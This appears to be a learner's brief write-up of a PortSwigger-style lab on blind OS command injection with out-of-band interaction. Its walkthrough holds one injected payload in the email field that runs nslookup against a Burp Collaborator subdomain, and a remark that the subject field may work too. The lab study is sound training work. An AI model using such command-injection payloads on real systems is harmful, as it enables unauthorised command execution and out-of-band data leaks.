`Burp Collabolator not included in Burp Community`
Title: Blind OS command injection with out-of-band interaction
Level: PRACTITIONER
Desc:  This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

# Walkthrough: 
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
I guess, that I could do the same in subject as in recent labs.
